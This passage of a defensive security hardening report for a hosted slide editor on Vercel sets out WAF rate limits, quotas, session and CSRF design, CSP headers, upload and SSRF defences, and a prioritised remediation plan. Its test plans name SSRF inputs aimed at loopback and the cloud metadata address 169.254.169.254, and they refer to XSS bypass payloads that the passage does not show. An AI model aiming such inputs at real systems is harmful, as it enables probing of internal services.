- Edge Config: a read optimized key value store for configuration; not a counter store (its write path is an API call, not an atomic increment). Not verified today (section 12); do not use it for counting. It is the right place for the kill switches (disable exports, disable uploads, read only mode) the plan proposes in P2.
- Blob: `put` with `ifMatch` gives optimistic concurrency (source S7) but a 60 s cache and per operation billing make it wrong for counters; the store can hold the daily quota ledger per identity (one JSON per identity per day, conditional put), which is coarse but free of new services.

### 7.4 The rule set proposed for the WAF

Log first for a week, then switch the action, per Vercel's own guidance (source S9). Windows are 60 s unless noted; limits are per IP and per region.

| Rule    | Path condition                                                                                                                                                                                                          | Key | Window | Limit | Action          | Why                                                                                                          |
| ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | ------ | ----- | --------------- | ------------------------------------------------------------------------------------------------------------ |
| R1      | `/_serverFn/*` (any server function)                                                                                                                                                                                    | IP  | 60 s   | 600   | 429             | the editor's own traffic (a write per keystroke commit plus a 20 s poll) stays well under it; scripts do not |
| R2      | `/api/render/*`                                                                                                                                                                                                         | IP  | 60 s   | 240   | 429             | 85 slides at two widths on a deck open is under 200                                                          |
| R3      | `/api/export/*` and `/_serverFn/*` with a header the export client sets (`x-turboslide-op: export`, Enterprise) or, on Pro, a dedicated route prefix `/api/x/export/*` introduced by P2 for the export server functions | IP  | 10 min | 12    | deny for 15 min | an export is minutes of CPU                                                                                  |
| R4      | `/api/decks/bundle`                                                                                                                                                                                                     | IP  | 10 min | 6     | deny for 15 min | 200 MB uploads                                                                                               |
| R5      | `/api/actions/*`                                                                                                                                                                                                        | IP  | 60 s   | 300   | 429             | an agent writes at human speed                                                                               |
| R6      | `/mcp`                                                                                                                                                                                                                  | IP  | 60 s   | 300   | 429             | as R5                                                                                                        |
| R7      | any path, status would be 401 (not expressible as a condition on Pro; instead: `/api/actions/*`, `/api/agent`, `/mcp` without an `Authorization` header)                                                                | IP  | 60 s   | 30    | deny for 1 h    | token guessing and scanners                                                                                  |
| R8      | `/auth/*` (P1's sign in and code routes)                                                                                                                                                                                | IP  | 60 s   | 10    | deny for 15 min | brute force                                                                                                  |
| R9      | `/auth/*`                                                                                                                                                                                                               | JA4 | 10 min | 60    | challenge       | distributed brute force with one client fingerprint                                                          |
| R10     | `/decks/*/assets/*`                                                                                                                                                                                                     | IP  | 60 s   | 600   | 429             | hotlinking                                                                                                   |
| R11     | whole site                                                                                                                                                                                                              | JA4 | 10 s   | 200   | challenge       | a flood from one client fingerprint                                                                          |
| Managed | Bot Protection in challenge mode; a bypass rule for the CLI's user agent `turboslide/` and for MCP clients (they do not solve challenges)                                                                               |     |        |       |                 | curl claiming Chrome is challenged; agents bypass by user agent and still need the bearer                    |

The per region caveat means R3 and R4 should be counted in the application as well (section 7.5). The dedicated route prefix in R3 exists because every server function shares `/_serverFn/<id>` and Pro rules cannot key on a header; P2 moves the export, render and upload server functions behind server routes with their own paths (`/api/x/export`, `/api/x/render`, `/api/x/upload`) that the page calls with the same CSRF headers, so the WAF can see them.

### 7.5 Quotas per identity in the application

Counted in Redis (or the Blob ledger until Redis exists), enforced in the server functions and routes, answered as 429 with `Retry-After` and a sentence the chrome shows.

| Quota                            | Anonymous session | Signed in | Agent token | Owner override |
| -------------------------------- | ----------------- | --------- | ----------- | -------------- |
| Writes per minute per deck       | 120               | 240       | 600         |                |
| Renders (slide, theme) per hour  | 400               | 2,000     | 5,000       |                |
| Exports per day                  | 5                 | 30        | 100         |                |
| Export concurrency               | 1                 | 1         | 2           |                |
| Standalone builds per day        | 3                 | 20        | 50          |                |
| Deck creates per day             | 5                 | 50        | 200         |                |
| Bundle uploads per day and bytes | 2, 100 MB         | 20, 2 GB  | 100, 10 GB  |                |
| Stored bytes total               | 500 MB            | 10 GB     | per token   | Kevin sets     |
| Comments per minute              | 10                | 30        | 60          |                |
| Presence updates per second      | 4                 | 4         |             |                |
| Attached pages                   | 4                 | 8         |             |                |
| MCP sessions per token           |                   |           | 16          |                |
| Long polls in flight             | 4                 | 8         |             |                |

Deck level caps independent of identity: 500 slides, 400 blocks per slide, 200 KB per slide document, 5 MB per `html` block, 25 MB of documents and 200 MB of assets per deck, 200 mutations per write, versions thinned after 30 days.

### 7.6 Kill switches

Edge Config flags read by the function at request time: `exportsEnabled`, `uploadsEnabled`, `renderThumbsEnabled`, `readOnly`, `htmlBlocksEnabled`, `signupEnabled`. Flipping one is a dashboard or CLI action with no deploy, which is what an incident needs at two in the morning.

## 8. Hardening plan by area

### 8.1 Identity, sessions and sign in

Round three's identity report decides the mechanism; this section states what security needs from it.

- Anonymous sessions from the first visit: a `__Host-ts_session` cookie (`Secure`, `HttpOnly`, `SameSite=Lax`, `Path=/`), value a 128 bit random id, session record in Redis with created, last seen, display name, avatar seed, and the verified identity id once signed in. The display name and avatar are text and a generated glyph; a name is at most 40 characters, rendered through React's text escaping, never through `innerHTML`; mentions in comments store identity ids, not names.
- Sign in without Google: passkeys (WebAuthn) as the primary factor remove passwords and the brute force they invite; the fallback for a device without a passkey is an email one time code (six digits, 10 minutes, five attempts per code, then the code is burned) or a magic link with a single use token; both rate limited per email and per IP (R8, R9 plus application counters), constant time comparisons, the same response whether or not the address exists.
- Sessions: rolling 12 hour idle expiry, 30 day absolute, revocation by listing sessions in the profile, re-authentication for share settings changes and delete forever.
- Authorization: every server function and route calls `authorize(session, deckId, capability)` before touching the store; the store itself refuses writes without an `Author` derived on the server; the collection filters lists by grants; the `HostedDecks` layer gains an ownership and grants record per deck (`decks/<id>/access.json`, written only by owners, cached in Redis).
- Roles: owner (everything), editor (write, comment, export with notes, share to viewers and commenters), commenter (read, comment, export without notes), viewer (read, export without notes). Link modes: restricted, anyone with the link can view or comment or edit. Request access creates a pending grant the owner sees.
- Agents: token records with scopes (F12 fix); an agent acts as its owner identity with the token's scopes intersected with the owner's role on the deck.

### 8.2 CSRF

- Server functions keep `createCsrfMiddleware` (source S12: `Sec-Fetch-Site`, `Origin`, `Referer`; requests without any are rejected; `origin` option for a differing public origin). With cookies, add `SameSite=Lax` (already) and make every state change a POST (none of the GET server functions mutate today; keep it so).
- Agent routes: refuse a browser `Origin` that is not the studio's own (agents send none), require `Content-Type: application/json`, enable the MCP transport's `allowedHosts` and `enableDnsRebindingProtection` (F13).
- The header free cancel gets a token (F9).
- New round three routes (comments, presence, share settings) are server functions or server routes under the same middleware; never a GET with side effects, never a cookie readable by script.

### 8.3 Security headers and CSP

Set from a global request middleware in `apps/studio/src/start.ts` (TanStack: request middleware runs before every request including server routes, SSR and server functions, and can set response headers; source S32) with Nitro `routeRules` as the fallback for static assets (source S33: `routeRules` maps route patterns to options including `headers`, marked experimental). The header set, following the OWASP cheat sheet (source S34):

- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'` on every route except `/embed/:id`, which sets `frame-ancestors https://prototemplate.com https://*.prototemplate.com` (and the customer domains the embed is sold for) and no `X-Frame-Options`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=()`
- `Cross-Origin-Opener-Policy: same-origin` (except `/embed`, where the frame's `postMessage` protocol needs the opener relationship left alone; test)
- `Cross-Origin-Resource-Policy: same-site` on the asset routes
- `Cache-Control: no-store` on every server function and API response (already on the agent routes)
- Remove `x-powered-by` if Nitro emits one (verify in the built output)

The CSP, nonce based because `__root.tsx` renders an inline boot script and an inline style block, and because TanStack Start supports a per request nonce handed to the router (the `csp-nonce` meta and `getGlobalStartContext().nonce` pattern, source S35, with the caveat that nonces are per request so prerendering and caching of HTML are off):

```
default-src 'self';
script-src 'self' 'nonce-<n>' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https://<public-store-id>.public.blob.vercel-storage.com;
font-src 'self';
connect-src 'self' https://<public-store-id>.public.blob.vercel-storage.com;
worker-src 'self' blob:;
frame-src 'self';
object-src 'none';
base-uri 'none';
form-action 'self';
frame-ancestors 'none';
upgrade-insecure-requests
```

`style-src 'unsafe-inline'` stays because the renderer emits inline `style` attributes on every block; the risk it leaves is CSS exfiltration, which the `html` block sanitizer and the sandboxed frame address, and it is the reason `img-src` and `connect-src` name hosts. Ship as `Content-Security-Policy-Report-Only` with a report endpoint for two weeks, fix the violations (the shader materials' workers and blobs, the Prototemplate embed), then enforce. The sandboxed `html` block frame carries its own `<meta http-equiv="Content-Security-Policy">` with `default-src 'none'`.

### 8.4 Untrusted HTML

Section 6.2 F4 has the three layers and the sharing policy. The decision points for the design report: whether the sandboxed frame renders in the editor at all times (recommended: yes, with a "Edit HTML" side panel showing source, since editing inside a sandboxed frame is impossible) and whether the standalone export embeds the frame (recommended: yes; a standalone file opened from disk has a `file://` origin where a same origin script is far more dangerous than on the host).

### 8.5 Uploads

- Every image (drop, paste, URL, bundle, avatar) goes through: size cap (25 MB source, 5 MB avatar), magic byte sniff (png, jpeg, webp, gif only on hosted), sharp decode with `limitInputPixels` set, `failOn: 'error'`, HEIF and AVIF blocked, animated GIFs flattened, then re-encode to PNG or JPEG at the twin sizes so no attacker bytes survive (OWASP file upload sheet, source S36: re-encoding destroys injected content; content type headers cannot be trusted; store under generated names). The asset record keeps the sha256 of the re-encoded twin.
- SVG: refused on hosted uploads, or rasterized (F5). Avatars are never SVG.
- Bundles: streamed, per entry caps, versions validated, per identity quotas (F16).
- Filenames: assets are already `assets/<slug>.<ext>`; keep it.
- Storage: the Blob host serves twins with `nosniff`, `X-Frame-Options: DENY` and `default-src 'none'` (source S8), so once P9 routes every user asset to Blob the app origin serves none.

### 8.6 SSRF

Section 6.3 F3 fix. One shared `safeFetch(url, { allowHosts, maxBytes, timeoutMs })` in `packages/headless/src/capture/shared.ts` used by `readInput`, `fetchBundleFromUrl` and the future "Image by URL" and comment link previews; Chromium routes closed during renders; DNS pinned; private ranges blocked; redirects manual; timeouts everywhere.

### 8.7 The agent routes and the bearer

Per agent tokens with scopes and revocation (F12), Origin and Content-Type checks (F13), a local default token (F13), 401 rate limits (R7), MCP session caps (F14), and the manifest's session list filtered to the caller's own pages (F14). The `x-turboslide-author` header becomes a `runId` only; the name comes from the token record (F2).

### 8.8 DoS and cost

Section 7 (rate limits, quotas, kill switches), plus: the thumbnail route gated by a signed URL from the page (F6); export and whole deck render as jobs with concurrency one per identity and a queue depth cap; the render cache keyed by content hash (revision plus theme plus scale already) kept; document size caps enforced in `applyWrite`; `/decks` reading a per identity index; the bundle route in the heavy function rule; the long poll capped per identity; a Vercel spend alert.

### 8.9 Chromium in the function

Section 6.5 F18 fix: renders in a project or worker without secrets, egress denied, web security flags dropped, binary current, crashes logged as security events.

### 8.10 Secrets

OIDC for Blob, `TURBOSLIDE_DOWNLOAD_SECRET` set, token hashing at rest for agent tokens, rotation runbook in docs/hosting.md, `process.env` never logged, preview and production environments with different tokens (already the case for the bearer per docs/hosting.md section 6; keep it for every new secret).

### 8.11 Logging and alerting

- One structured JSON line per security relevant event, written with `console.log` so the runtime log and a Drain both receive it: `{ t, event, requestId, identity, ip (hashed with a daily salt), deckId, action, revision, bytes, ms, status, reason }` for every write, delete, share change, sign in attempt, export, upload, 401, 403, 429, sanitizer rewrite, Chromium crash, SSRF refusal. Vercel's request id and `x-vercel-id` join the line to the platform log (source S4, S13).
- A Drain (Pro, $0.50 per GB, source S15) to a log store with 30 day retention; runtime logs alone are one day on Pro (source S13).
- Alerts: 429 and 403 rates per route above a threshold, exports per hour above a threshold, function invocations per hour above a threshold, active CPU spend per day above a budget, any `sanitizer.rewrite` on a deck shared beyond its owner, any Chromium crash, any SSRF refusal. The firewall's own alerts cover only platform DDoS above 100,000 requests per 10 minutes (source S14), delivered by webhook or the Slack app; subscribe to those too.
- An activity feed per deck (round three feature A) is the same event stream filtered by deck and shown to editors; write it once, read it twice.

### 8.12 Dependency audit

`pnpm audit --prod --audit-level=high` in `scripts/check.mjs` with `audit-allow.json` for accepted findings and their expiry; Renovate or Dependabot on the catalog with a weekly cadence; the three advisories of F17 closed in P3; `@sparticuz/chromium` and Playwright bumped together; the lockfile's `minimumReleaseAge` kept (it delays fresh supply chain attacks) with explicit exclusions only for pinned versions, as `pnpm-workspace.yaml` already does for zod.

### 8.13 The Blob store

F8 fix: two stores, private for documents and outputs, public with random suffixes for twins; the store firewall enabled; `TURBOSLIDE_BLOB_ACCESS=private` until the split.

## 9. The plan in priority order

Each step names the findings it closes, the dependency, and the verification.

| Step                    | Work                                                                                                                                                                                                                                                                                                                                                                                                                                     | Closes                                                 | Depends on                                             | Verification                                                                                                                                                                                                                                                                 |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ | ------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| P0 (day one, no design) | Bump sharp to 0.35.4 and block HEIF and AVIF; override image-size; set `TURBOSLIDE_DOWNLOAD_SECRET`; remove `localhost`, `127.0.0.1`, `::1` from `DEFAULT_ALLOW_HOSTS` when hosted; refuse `file` on hosted transports; add `AbortSignal.timeout` and a streaming byte cap to `readInput`; serve `.svg` and `.json` assets as attachments with `nosniff`; WAF rules R1, R2, R4, R5, R6, R10, R11 in log mode; Bot Protection in log mode | F3 (part), F5 (part), F17, F19 (part), F6 (visibility) | none                                                   | unit tests for `readInput` refusing paths and loopback; `pnpm audit` clean; a hosted smoke row that fetches an svg asset and asserts `content-disposition: attachment`                                                                                                       |
| P1                      | Anonymous sessions, identity, ownership, roles, `authorize()` on every server function and route, server derived authors, share links as tokens, agent tokens as records                                                                                                                                                                                                                                                                 | F1, F2, F12, F21, F22                                  | the identity and sharing design reports of round three | e2e: a second browser context cannot write, trash or delete a restricted deck; versions attribute to the session; `?author=` is ignored; 401 and 403 bodies carry no detail                                                                                                  |
| P2                      | Export, render and upload server functions moved behind `/api/x/*` routes; WAF rules switched to enforce with persistent deny on R3, R4, R7; `@vercel/firewall` checks keyed by identity on those routes; Upstash Redis with `@upstash/ratelimit` for the quota table; kill switches in Edge Config; thumbnail route behind signed URLs                                                                                                  | F6, F7, F9, F14                                        | P1 for identity keys                                   | load test in a preview with Protection Bypass: the 601st server function call in a minute from one IP is 429; the sixth export of the day for an anonymous session is 429 with `Retry-After`; kill switch flips without a deploy                                             |
| P3                      | Dependency gate in `pnpm check`; Chromium bump; Nitro and TanStack tracked                                                                                                                                                                                                                                                                                                                                                               | F17                                                    | none                                                   | `pnpm check` fails on a high advisory not in the allowlist                                                                                                                                                                                                                   |
| P4                      | `html` block: DOMPurify at write and render, CSS filter, sandboxed `srcdoc` frame in studio, viewer, print, present and standalone; link scheme checks; owner switch for shared decks                                                                                                                                                                                                                                                    | F4                                                     | P1 for the owner switch                                | a fixture deck with the eight bypass payloads of F4 renders without a script running (Playwright asserts no dialog, no request to the beacon host, the frame's origin is opaque); the canvas fidelity gate still passes on the GT deck's escape blocks                       |
| P5                      | Image pipeline: sniff, decode limits, re-encode, SVG policy, avatar uploads; bundle streaming and version validation                                                                                                                                                                                                                                                                                                                     | F5, F16, F17 (part)                                    | P1 for quotas                                          | uploads of a script bearing SVG, a 400 MB inflating zip, a HEIF disguised as PNG are refused with 400 and nothing is written                                                                                                                                                 |
| P6                      | `safeFetch` with pinned DNS and blocked ranges; Chromium routes closed during renders; `asset.capture` and `material.capture` contexts restricted                                                                                                                                                                                                                                                                                        | F3, F18 (part)                                         | none                                                   | unit tests with a fake resolver (a name resolving to 127.0.0.1 and 169.254.169.254 is refused; a redirect to a private address is refused); a render of a slide whose `html` block references `http://127.0.0.1/x` completes with the request aborted (Playwright route log) |
| P7                      | Security headers and CSP report only, then enforce; `/embed` exception                                                                                                                                                                                                                                                                                                                                                                   | F15                                                    | P4 (the frame)                                         | a hosted smoke row asserts every header on `/`, `/edit/:id`, `/deck/:id` and the exception on `/embed/:id`; zero CSP reports for a week before enforcing                                                                                                                     |
| P8                      | Renders and exports in a function or worker without secrets; web security flags dropped                                                                                                                                                                                                                                                                                                                                                  | F18                                                    | P6                                                     | the render project's environment lists no Blob token or bearer; `renderer` string still records the binary; the fidelity gate passes                                                                                                                                         |
| P9                      | Private Blob store for documents, exports, bundles; public store with random suffixes for twins; store firewall on                                                                                                                                                                                                                                                                                                                       | F8                                                     | P1                                                     | an unauthenticated fetch of a document's former public URL is 403; a twin's URL is not derivable from the deck id                                                                                                                                                            |
| P10                     | Structured security log, Drain, alerts, activity feed; agent token rotation runbook                                                                                                                                                                                                                                                                                                                                                      | F20, F12 (rotation)                                    | P1, P2                                                 | a synthetic 403, 429, sanitizer rewrite and SSRF refusal each appear in the Drain within a minute with the fields of section 8.11                                                                                                                                            |

The order puts P0 (a day of low risk edits) and P1 (the design dependency for everything) first, then the cost limits (P2) because they protect the budget while the rest lands, then the content fixes (P4, P5, P6), then the platform hardening (P7, P8, P9), then observability (P10). P3 runs in parallel with anything.

## 10. Verification beyond the table

- `apps/studio/e2e/security.spec.ts` (new): the F4 payload fixture, the SVG and bundle refusals, the 401 and 403 shapes, the headers, the cross site form POST against the dev server's `/api/actions` (must be refused after F13).
- `packages/headless/src/capture/shared.test.ts`: `readInput` with `allowPaths: false`, the resolver fakes, the redirect chain, the byte cap, the timeout.
- `packages/render/src/__tests__/html-escape.test.ts`: the eight payloads against the DOMPurify path, the CSS filter's `@import`, `url()`, `position: fixed` cases, the link scheme check.
- `scripts/hosted-smoke.mjs`: new rows for headers, the svg attachment, the 429 on the render route after the limit, the private store 403.
- `scripts/check.mjs`: the audit step; a step that greps `dangerouslySetInnerHTML` and `innerHTML` and fails on any new call site outside the allowlisted four.
- A quarterly external review of the render function's Chromium version against the Chrome release schedule.

## 11. Google's behaviour as the reference for feature A, and where this report stops

The collaboration behaviours (live cursors, comments, roles, version history by author) are report 01 of this round and research/10 of round one. Security follows them in three places: roles must be enforced on the server for every read and write (F1); comments and mentions are text stored with identity ids and rendered as text; presence channels carry identity ids and cursor positions only, never markup. Google's accounts, Drive sharing and infrastructure are out of reach, so the substitutes are the sessions, passkeys and the two Blob stores of this report.

## 12. Unverified claims

1. What listens on loopback inside a Vercel fluid compute function (a Lambda style runtime API or anything else). Vercel's limits page states that under fluid compute the `AWS_LAMBDA_RUNTIME_API` variable and its siblings are not accessible (source S6), which suggests the runtime API is hidden from code, not that nothing listens. F3's loopback item is therefore "the request is made" rather than "the request reaches a known service".
2. Whether Vercel adds `Strict-Transport-Security` or other security headers on `*.vercel.app` responses by default. The CDN security page was not read. P7 sets the headers regardless.
3. Whether a Chromium release newer than 147 is current on 2026-09-13, and whether `@sparticuz/chromium` ships it. The package README read today does not list its flags or discuss their tradeoffs (source S37); the flag list in this report comes from Turboslide's own `launch.ts` comments and docs/hosting-chromium.md.
4. The Chromium Linux sandboxing document could not be fetched (404 at both paths tried); the statement that the sandbox contains a compromised renderer is general knowledge, not a quotation.
5. `image-size` patched version: the pnpm advisory feed says `>=2.0.3`, the GitHub advisory page read today says no patched version. The fix in P3 (override or pass explicit dimensions to pptxgenjs) does not depend on which is right.
6. Edge Config's write latency and its unsuitability as a counter store were not verified from a page today; the recommendation to use it only for kill switches stands on its documented purpose as a configuration store.
7. Vercel Blob signed URLs (announced in a changelog listed on the Blob page, source S7) were not read; P9 names them as an option beside function delivery.
8. Nitro `routeRules` headers on the Vercel preset: the config page marks `routeRules` experimental and does not list preset support (source S33); P7 sets headers in the TanStack middleware first and uses `routeRules` only for static assets after testing on a preview.
9. The exact content of the WAF "API rate limit" template in the firewall templates repository (source S28) was not read.
10. Vercel WAF rate limiting pricing on Pro is "usage based" (source S2); the per request price was not read.
11. `rel="noreferrer"` implying `noopener` is stated from memory of the HTML standard; the fix adds both tokens so nothing depends on it.
12. `about:srcdoc` frames and the parent's `frame-src` directive: the interaction was not verified; P7's report only phase will show it.

## 13. Sources

Every page below was read on 2026-09-13.

- S1 Vercel, Deployment Protection, https://vercel.com/docs/deployment-protection
- S2 Vercel, WAF Rate Limiting, https://vercel.com/docs/vercel-firewall/vercel-waf/rate-limiting
- S3 Vercel, Rate Limiting SDK, https://vercel.com/docs/vercel-firewall/vercel-waf/rate-limiting-sdk
- S4 Vercel, Request headers, https://vercel.com/docs/headers/request-headers
- S5 Vercel, Fluid compute, https://vercel.com/docs/fluid-compute
- S6 Vercel, Vercel Functions Limits, https://vercel.com/docs/functions/limitations
- S7 Vercel, Vercel Blob, https://vercel.com/docs/vercel-blob
- S8 Vercel, Vercel Blob Security, https://vercel.com/docs/vercel-blob/security, and Public Storage, https://vercel.com/docs/vercel-blob/public-storage
- S9 Vercel, WAF Custom Rules, https://vercel.com/docs/vercel-firewall/vercel-waf/custom-rules
- S10 Vercel changelog, Manage Vercel Firewall in the CLI (2026-05-12), https://vercel.com/changelog/manage-vercel-firewall-in-the-cli
- S11 Vercel REST API, Update Firewall Configuration, https://vercel.com/docs/rest-api/reference/endpoints/security/update-firewall-configuration
- S12 TanStack Start, Server Functions (CSRF protection section), https://tanstack.com/start/latest/docs/framework/react/guide/server-functions
- S13 Vercel, Runtime Logs, https://vercel.com/docs/runtime-logs
- S14 Vercel, Firewall Observability, https://vercel.com/docs/vercel-firewall/firewall-observability
- S15 Vercel, Working with Drains, https://vercel.com/docs/drains
- S16 OWASP Top 10:2025, https://top10.owasp.org/2025
- S17 OWASP API Security Top 10 2023, https://api-security.owasp.org/editions/2023/en/0x11-t10
- S18 OWASP Cheat Sheet Series, Server Side Request Forgery Prevention, https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- S19 MDN, The Inline Frame element (sandbox, srcdoc, credentialless), https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe
- S20 DOMPurify README (v3.4.15), https://github.com/cure53/DOMPurify
- S21 sharp, Constructor (limitInputPixels, failOn, unlimited, input formats), https://sharp.pixelplumbing.com/api-constructor/
- S22 SecureLayer7 Labs, CVE-2026-61704 link-preview-js DNS rebinding SSRF bypass (the undici pinned dispatcher fix), https://securelayer7.net/lab/cve-2026-61704-link-preview-js-dns-rebinding-ssrf-bypass, and the fix pull request, https://github.com/OP-Engineering/link-preview-js/pull/181
- S23 request-filtering-agent README, https://github.com/azu/request-filtering-agent
- S24 GitHub Advisory GHSA-rgj7-g3m4-5g8c, sharp: vulnerabilities in libheif, https://github.com/advisories/GHSA-rgj7-g3m4-5g8c
- S25 GitHub Advisory GHSA-w3rx-r6r6-pgpr, image-size ICNS parser infinite loop, https://github.com/advisories/GHSA-w3rx-r6r6-pgpr (GHSA-5p2g-fcmc-qvqq reported by `pnpm audit` alongside it)
- S26 Model Context Protocol specification 2025-06-18, Transports (Streamable HTTP security warning, session management), https://modelcontextprotocol.io/specification/2025-06-18/basic/transports
- S27 Playwright, BrowserType.launch options (chromiumSandbox default false, args warning), https://playwright.dev/docs/api/class-browsertype
- S28 Vercel firewall templates repository, https://github.com/vercel/firewall-templates
- S29 Vercel, WAF Managed Rulesets, https://vercel.com/docs/vercel-firewall/vercel-waf/managed-rulesets
- S30 Vercel, Bot Management, https://vercel.com/docs/bot-management
- S31 Upstash, @upstash/ratelimit overview, https://upstash.com/docs/redis/sdks/ratelimit-ts/overview
- S32 TanStack Start, Middleware (global request middleware, handlerType), https://tanstack.com/start/latest/docs/framework/react/guide/middleware
- S33 Nitro, Configuration (routeRules headers), https://nitro.build/config
- S34 OWASP Cheat Sheet Series, HTTP Headers, https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
- S35 vseventer.com, Configuring Content Security Policy (CSP) in TanStack Start (2025-10-09, updated 2025-10-20), https://www.vseventer.com/blog/configuring-content-security-policy-csp-in-tanstack-start
- S36 OWASP Cheat Sheet Series, File Upload, https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- S37 @sparticuz/chromium README, https://github.com/Sparticuz/chromium
- S38 Vercel blog, Vercel WAF upgrade brings persistent actions, rate limiting, and API control (2024-10-02), https://vercel.com/blog/vercel-waf-upgrade-brings-persistent-actions-rate-limiting-and-api-control
- Local: `pnpm audit --json` output of 2026-09-13 (3 high, 0 critical, 673 dependencies); the Turboslide files listed in section 2; docs/gslides-parity/research/10-identity-sharing-and-presence.md (2026-09-11); docs/hosting.md, docs/hosting-chromium.md, docs/deck-transfer.md, docs/spec/SPEC.md section 11.
